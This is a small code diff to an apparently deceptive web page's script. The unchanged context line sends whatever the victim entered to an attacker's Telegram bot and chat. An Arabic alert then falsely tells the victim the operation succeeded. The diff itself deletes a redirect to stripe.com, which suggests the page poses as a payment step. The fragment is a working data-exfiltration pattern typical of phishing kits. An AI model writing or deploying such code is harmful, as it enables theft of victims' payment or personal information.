@@ -67,7 +67,7 @@
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(data)}`)
             .then(() => {
                 alert("تمت العملية بنجاح! جاري المعالجة...");
-                window.location.href = "https://stripe.com";
+        
             });
     });
 </script>
